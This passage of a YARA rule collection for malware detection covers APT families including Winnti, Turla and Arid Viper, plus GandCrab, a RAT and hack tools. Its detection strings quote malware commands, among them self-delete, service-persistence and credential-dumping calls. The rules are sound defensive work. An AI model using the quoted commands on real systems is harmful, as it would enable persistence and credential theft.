MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\tmp\\\\Google_updata.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule MAL_BurningUmbrella_Sample_15_RID31D9 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"be6bea22e909bd772d21647ffee6d15e208e386e8c3c95fd22816c6b94196ae8\"\n      hash2 = \"72a8fa454f428587d210cba0e74735381cd0332f3bdcbb45eecb7e271e138501\"\n      hash3 = \"9cc38ea106efd5c8e98c2e8faf97c818171c52fa3afa0c4c8f376430fa556066\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and pe.imphash ( ) == \"cc33b1500354cf785409a3b428f7cd2a\"\n}\n\nrule MAL_BurningUmbrella_Sample_16_RID31DA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"58bb3859e02b8483e9f84cc56fbd964486e056ef28e94dd0027d361383cc4f4a\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://netimo.net 0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule MAL_BurningUmbrella_Sample_17_RID31DB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fa380dac35e16da01242e456f760a0e75c2ce9b68ff18cfc7cfdd16b2f4dec56\"\n      hash2 = \"854b64155f9ceac806b49f3e352949cc292e5bc33f110d965cf81a93f78d2f07\"\n      hash3 = \"1e462d8968e8b6e8784d7ecd1d60249b41cf600975d2a894f15433a7fdf07a0f\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"syshell\" fullword wide\n      $s2 = \"Normal.dotm\" fullword ascii\n      $s3 = \"Microsoft Office Word\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule MAL_BurningUmbrella_Sample_18_RID31DC : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d8df60524deb6df4f9ddd802037a248f9fbdd532151bb00e647b233e845b1617\"\n      hash2 = \"c55cb6b42cfabf0edf1499d383817164d1b034895e597068e019c19d787ea313\"\n      hash3 = \"32144ba8370826e069e5f1b6745a3625d10f50a809f3f2a72c4c7644ed0cab03\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"c:\\\\tmp\\\\tran.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"11675b4db0e7df7b29b1c1ef6f88e2e1\" or pe.imphash ( ) == \"364e1f68e2d412db34715709c68ba467\" or pe.exports ( \"deKernel\" ) or 1 of them )\n}\n\nrule MAL_BurningUmbrella_Sample_19_RID31DD : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05e2912f2a593ba16a5a094d319d96715cbecf025bf88bb0293caaf6beb8bc20\"\n      hash2 = \"e7bbdb275773f43c8e0610ad75cfe48739e0a2414c948de66ce042016eae0b2e\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cryption.dll\" fullword ascii\n      $s2 = \"tran.exe\" fullword ascii\n      $s3 = \"Kernel.dll\" fullword ascii\n      $s4 = \"Now ready to get the file %s!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule MAL_BurningUmbrella_Sample_20_RID31D5 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"5c12379cd7ab3cb03dac354d0e850769873d45bb486c266a893c0daa452aa03c\"\n      hash2 = \"172cd90fd9e31ba70e47f0cc76c07d53e512da4cbfd197772c179fe604b75369\"\n      hash3 = \"1ce88e98c8b37ea68466657485f2c01010a4d4a88587ba0ae814f37680a2e7a8\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"Wordpad.Document.1\\\\shell\\\\open\\\\command\\\\\" wide\n      $s2 = \"%s\\\\shell\\\\Open\\\\command\" fullword wide\n      $s3 = \"expanding computer\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"bac338bfe2685483c201e15eae4352d5\" or 2 of them )\n}\n\nrule MAL_BurningUmbrella_Sample_21_RID31D6 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4b7b9c2a9d5080ccc4e9934f2fd14b9d4e8f6f500889bf9750f1d672c8724438\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\ime\\\\setup.exe\" fullword ascii\n      $s2 = \"ws.run \\\"later.bat /start\\\",0Cet \" fullword ascii\n      $s3 = \"del later.bat\" fullword ascii\n      $s4 = \"mycrs.xls\" fullword ascii\n      $a1 = \"-el -s2 \\\"-d%s\\\" \\\"-p%s\\\" \\\"-sp%s\\\"\" fullword ascii\n      $a2 = \"<set ws=wscript.createobject(\\\"wscript.shell\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them\n}\n\nrule MAL_BurningUmbrella_Sample_22_RID31D7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"fa116cf9410f1613003ca423ad6ca92657a61b8e9eda1b05caf4f30ca650aee5\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\\" ascii\n      $s3 = \"Content-Disposition: form-data; name=\\\"txt\\\"; filename=\\\"\" fullword ascii\n      $s4 = \"Fail To Enum Service\" fullword ascii\n      $s5 = \"Host Power ON Time\" fullword ascii\n      $s6 = \"%d Hours %2d Minutes %2d Seconds \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule MAL_AirdViper_Sample_Apr18_1_RID310C : APT DEMO EXE FILE G1028 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Arid Viper malware sample\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-04 13:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f453f1d5088bd17c60e812289b4bb0a734b7ad2ba5a536f5fd6d6ac3b8f3397\"\n      tags = \"APT, DEMO, EXE, FILE, G1028, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \\\"%s\\\"\" fullword ascii\n      $x2 = \"daenerys=%s&\" ascii\n      $x3 = \"betriebssystem=%s&anwendung=%s&AV=%s\" ascii\n      $s1 = \"Taskkill /IM  %s /F &  %s\" fullword ascii\n      $s2 = \"/api/primewire/%s/requests/macKenzie/delete\" fullword ascii\n      $s3 = \"\\\\TaskWindows.exe\" ascii\n      $s4 = \"MicrosoftOneDrives.exe\" fullword ascii\n      $s5 = \"\\\\SeanSansom.txt\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule MAL_Winnti_Sample_May18_1_RID3003 : APT CHINA DEMO EXE FILE G0044 GEN MAL {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report - Generic Winnti Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 12:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"528d9eaaac67716e6b37dd562770190318c8766fa1b2f33c0974f7d5f6725d41\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0044, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wireshark\" fullword wide\n      $s2 = \"procexp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule MAL_Visel_Sample_May18_1_RID2F8D : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Visel malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 12:02:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"35db8e6a2eb5cf09cd98bf5d31f6356d0deaf4951b353fc513ce98918b91439c\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s2 = \"print32.dll\" fullword ascii\n      $s3 = \"c:\\\\a\\\\b.txt\" fullword ascii\n      $s4 = \"\\\\temp\\\\s%d.dat\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.exports ( \"szFile\" ) or 2 of them )\n}\n\nrule MAL_Turla_Sample_May18_1_RID2F92 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Turla samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/omri9741/status/991942007701598208\"\n      date = \"2018-05-03 12:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4c49c9d601ebf16534d24d2dd1cab53fde6e03902758ef6cff86be740b720038\"\n      hash2 = \"77cbd7252a20f2d35db4f330b9c4b8aa7501349bc06bbcc8f40ae13d01ae7f8f\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sc %s create %s binPath= \\\"cmd.exe /c start %%SystemRoot%%\\\\%s\\\">>%s\" fullword ascii\n      $x2 = \"cmd.exe /c start %%SystemRoot%%\\\\%s\" fullword ascii\n      $x3 = \"cmd.exe /c %s\\\\%s -s %s:%s:%s -c \\\"%s %s /wait 1\\\">>%s\" fullword ascii\n      $x4 = \"Read InjectLog[%dB]********************************\" fullword ascii\n      $x5 = \"%s\\\\System32\\\\011fe-3420f-ff0ea-ff0ea.tmp\" fullword ascii\n      $x6 = \"**************************** Begin ini %s [%d]***********************************************\" fullword ascii\n      $x7 = \"%s -o %s -i %s -d exec2 -f %s\" fullword ascii\n      $x8 = \"Logon to %s failed: code %d(User:%s,Pass:%s)\" fullword ascii\n      $x9 = \"system32\\\\dxsnd32x.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them\n}\n\nrule SUSP_Bad_PDF_RID2AFB : DEMO FILE SUSP {\n   meta:\n      description = \"Detects PDF that embeds code to steal NTLM hashes\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"Internal Research\"\n      date = \"2018-05-03 08:47:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d8c502da8a2b8d1c67cb5d61428f273e989424f319cfe805541304bdb7b921a8\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"         /F (http//\" ascii\n      $s2 = \"        /F (\\\\\\\\\\\\\\\\\" ascii\n      $s3 = \"<</F (\\\\\\\\\" ascii\n   condition: \n      ( uint32 ( 0 ) == 0x46445025 or uint32 ( 0 ) == 0x4450250a ) and 1 of them\n}\n\nrule MAL_Hogfish_Report_Related_Sample_RID33CE : APT CHINA DEMO EXE FILE G0045 MAL {\n   meta:\n      description = \"Detects APT10 / Hogfish related samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n      date = \"2018-05-01 15:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f9acc706d7bec10f88f9cfbbdf80df0d85331bd4c3c0188e4d002d6929fe4eac\"\n      hash2 = \"7188f76ca5fbc6e57d23ba97655b293d5356933e2ab5261e423b3f205fe305ee\"\n      hash3 = \"4de5a22cd798950a69318fdcc1ec59e9a456b4e572c2d3ac4788ee96a4070262\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0045, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"R=user32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"efad9ff8c0d2a6419bf1dd970bcd806d\" or 1 of them )\n}\n\nrule MAL_RedLeaves_Apr18_1_RID2E40 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects RedLeaves malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n      date = \"2018-05-01 11:06:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f6449e255bc1a9d4a02391be35d0dd37def19b7e20cfcc274427a0b39cb21b7b\"\n      hash2 = \"db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d\"\n      hash3 = \"d956e2ff1b22ccee2c5d9819128103d4c31ecefde3ce463a6dea19ecaaf418a1\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"7a861cd9c495e1d950a43cb708a22985\" or pe.imphash ( ) == \"566a7a4ef613a797389b570f8b4f79df\" )\n}\n\nrule MAL_Sednit_DelphiDownloader_Apr18_3_RID33F2 : DEMO EXE FILE G0007 MAL {\n   meta:\n      description = \"Detects malware from Sednit Delphi Downloader report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/\"\n      date = \"2018-04-24 15:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"ecb835d03060db1ea3496ceca2d79d7c4c6c671c9907e0b0e73bf8d3371fa931\"\n      hash2 = \"e355a327479dcc4e71a38f70450af02411125c5f101ba262e8df99f9f0fef7b6\"\n      tags = \"DEMO, EXE, FILE, G0007, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Processor Level: \" fullword ascii\n      $ = \"CONNECTION ERROR\" fullword ascii\n      $ = \"FILE_EXECUTE_AND_KILL_MYSELF\" ascii\n      $ = \"-KILL_PROCESS-\" ascii\n      $ = \"-FILE_EXECUTE-\" ascii\n      $ = \"-DOWNLOAD_ERROR-\" ascii\n      $ = \"CMD_EXECUTE\" fullword ascii\n      $ = \"\\\\Interface\\\\Office\\\\{31E12FE8-937F-1E32-871D-B1C9AOEF4D4}\\\\\" ascii\n      $ = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of them\n}\n\nrule MAL_GandCrab_Apr18_1_RID2DB7 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects GandCrab malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/MarceloRivero/status/988455516094550017\"\n      date = \"2018-04-23 10:43:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6fafe7bb56fd2696f2243fc305fe0c38f550dffcfc5fca04f70398880570ffff\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == \"7936b0e9491fd747bf2675a7ec8af8ba\"\n}\n\nrule ProcessInjector_Gen_RID2EA7 : DEMO EXE GEN HIGHVOL HKTL {\n   meta:\n      description = \"Detects a process injection utility that can be used ofr good and bad purposes\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/cuckoosandbox/monitor/blob/master/bin/inject.c\"\n      date = \"2018-04-23 11:23:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"456c1c25313ce2e2eedf24fdcd4d37048bcfff193f6848053cbb3b5e82cd527d\"\n      tags = \"DEMO, EXE, GEN, HIGHVOL, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Error injecting remote thread in process:\" fullword ascii\n      $s5 = \"[-] Error getting access to process: %ld!\" fullword ascii\n      $s6 = \"--process-name <name>  Process name to inject\" fullword ascii\n      $s12 = \"No injection target has been provided!\" fullword ascii\n      $s17 = \"[-] An app path is required when not injecting!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( pe.imphash ( ) == \"d27e0fa013d7ae41be12aaf221e41f9b\" or 1 of them ) or 3 of them\n}\n\nrule MAL_WebMonitor_RAT_RID2D96 : DEMO EXE FILE MAL T1047 T1057 {\n   meta:\n      description = \"Detects WebMonitor RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/04/unit42-say-cheese-webmonitor-rat-comes-c2-service-c2aas/\"\n      date = \"2018-04-13 10:38:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27aaad8a7b3fd53d99077a9202e8bed05696c843ed2485bea6eb9e33a1c273ac\"\n      hash2 = \"05111c305028b5d822ecd12de9879560223c42860cc9d448c47886c236648607\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"send_keylog_stream_start\" fullword wide\n      $x2 = \"KEYLOG_STREAM_STOP\" fullword wide\n      $s1 = \"SHELL_EXEC\" fullword wide\n      $s2 = \"send_shell_exec\" fullword wide\n      $s3 = \"send_connections_get\" fullword wide\n      $a1 = \"Select * from Win32_PerfRawData_PerfProc_Process where IDProcess = '\" fullword wide\n      $a2 = \"Select * from Win32_Process WHERE handle =\" fullword wide\n      $a3 = \"Select * from Win32_Process where ProcessId=\" fullword wide\n      $a4 = \"Select * from Win32_ComputerSystem\" fullword wide\n      $a5 = \"The service is in the process of being continued\" fullword wide\n      $a6 = \"tcpdump\" fullword wide\n      $a7 = \"memdump\" fullword wide\n      $a8 = \"<val1>Processor</val1>\" fullword wide\n      $a9 = \"Win32 share process\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or ( 2 of ( $s* ) and 2 of ( $a* ) ) or 7 of them )\n}\n\nrule WINNTI_KingSoft_Moz_Confustion_RID328A : CHINA DEMO EXE FILE G0044 G0096 MAL {\n   meta:\n      description = \"Detects Barium sample with Copyright confusion\"\n      author = \"Markus Neis\"\n      reference = \"https://www.virustotal.com/en/file/070ee4a40852b26ec0cfd79e32176287a6b9d2b15e377281d8414550a83f6496/analysis/\"\n      date = \"2018-04-13 14:09:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"070ee4a40852b26ec0cfd79e32176287a6b9d2b15e377281d8414550a83f6496\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, G0096, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"7f01b23ccfd1017249c36bc1618d6892\" or ( pe.version_info [ \"LegalCopyright\" ] contains \"Mozilla Corporation\" and pe.version_info [ \"ProductName\" ] contains \"Kingsoft\" ) )\n}\n\nrule MAL_Turla_Agent_BTZ_RID2DEF : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Turla Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified\"\n      date = \"2018-04-12 10:53:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"c4a1cd6916646aa502413d42e6e7441c6e7268926484f19d9acbf5113fc52fc8\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\" fullword ascii\n      $x3 = \"mstotreg.dat\" fullword ascii\n      $x4 = \"Bisuninst.bin\" fullword ascii\n      $x5 = \"mfc42l00.pdb\" fullword ascii\n      $x6 = \"ielocal~f.tmp\" fullword ascii\n      $s1 = \"%s\\\\1.txt\" fullword ascii\n      $s2 = \"%windows%\" fullword ascii\n      $s3 = \"%s\\\\system32\" fullword ascii\n      $s4 = \"\\\\Help\\\\SYSTEM32\\\\\" ascii\n      $s5 = \"%windows%\\\\mfc42l00.pdb\" ascii\n      $s6 = \"Size of log(%dB) is too big, stop write.\" fullword ascii\n      $s7 = \"Log: Size of log(%dB) is too big, stop write.\" fullword ascii\n      $s8 = \"%02d.%02d.%04d Log begin:\" fullword ascii\n      $s9 = \"\\\\system32\\\\win.com\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule Turla_KazuarRAT_RID2CCD : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Turla Kazuar RAT described by DrunkBinary\"\n      author = \"Markus Neis\"\n      reference = \"https://twitter.com/DrunkBinary/status/982969891975319553\"\n      date = \"2018-04-08 10:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6b5d9fca6f49a044fd94c816e258bf50b1e90305d7dab2e0480349e80ed2a0fa\"\n      hash2 = \"743b3347dc86b4a4aa6510648076eeca9eec0ff23c1294b3931263c990bcb5e6\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"~1.EXE\" wide\n      $s2 = \"dl32.dll\" fullword ascii\n      $s3 = \"HookProc@\" ascii\n      $s4 = \"0`.wtf\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.imphash ( ) == \"682156c4380c216ff8cb766a2f2e8817\" or 2 of them )\n}\n\nrule Crackmapexec_EXE_RID2D19 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects CrackMapExec hack tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 10:17:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"371f104b7876b9080c519510879235f36edb6668097de475949b84ab72ee9a9a\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"core.scripts.secretsdump(\" ascii\n      $s2 = \"core.scripts.samrdump(\" ascii\n      $s3 = \"core.uacdump(\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 2 of them\n}\n\nrule SUSP_Imphash_PassRevealer_PY_EXE_RID32FA : DEMO EXE FILE HKTL SCRIPT SUSP T1003 {\n   meta:\n      description = \"Detects an imphash used by password revealer and hack tools (some false positives with hardware driver installers)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 14:28:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-11-09\"\n      hash1 = \"371f104b7876b9080c519510879235f36edb6668097de475949b84ab72ee9a9a\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, SUSP, T1003\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $fp1 = \"Assmann Electronic GmbH\" ascii wide\n      $fp2 = \"Oculus VR\" ascii wide\n      $fp3 = \"efm8load\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and pe.imphash ( ) == \"ed61beebc8d019dd9bec823e2d694afd\" and not 1 of ( $fp* )\n}\n\nrule MAL_Unknown_PWDumper_Apr18_3_RID312A : DEMO EXE FILE HKTL MAL {\n   meta:\n      description = \"Detects sample from unknown sample set - IL origin\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 13:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d435e7b6f040a186efeadb87dd6d9a14e038921dc8b8658026a90ae94b4c8b05\"\n      hash2 = \"8c35c71838f34f7f7a40bf06e1d2e14d58d9106e6d4e6f6e9af732511a126276\"\n      tags = \"DEMO, EXE, FILE, HKTL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"loaderx86.dll\" fullword ascii\n      $s2 = \"tcpsvcs.exe\" fullword wide\n      $s3 = \"%Program Files, Common FOLDER%\" fullword wide\n      $s4 = \"%AllUsers, ApplicationData FOLDER%\" fullword wide\n      $s5 = \"loaderx86\" fullword ascii\n      $s6 = \"TNtDllHook$\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CVE_2014_4076_Exploitcode_RID2F24 : CVE_2014_4076 DEMO EXE EXPLOIT FILE T1068 {\n   meta:\n      description = \"Detects an exploit code for CVE-2014-4076\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Neo23x0/yarGen\"\n      date = \"2018-04-04 11:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"44690af85efef2db04c7e8cba7ca0d0e53be1a1432a339570a7d26eec860b8ee\"\n      tags = \"CVE_2014_4076, 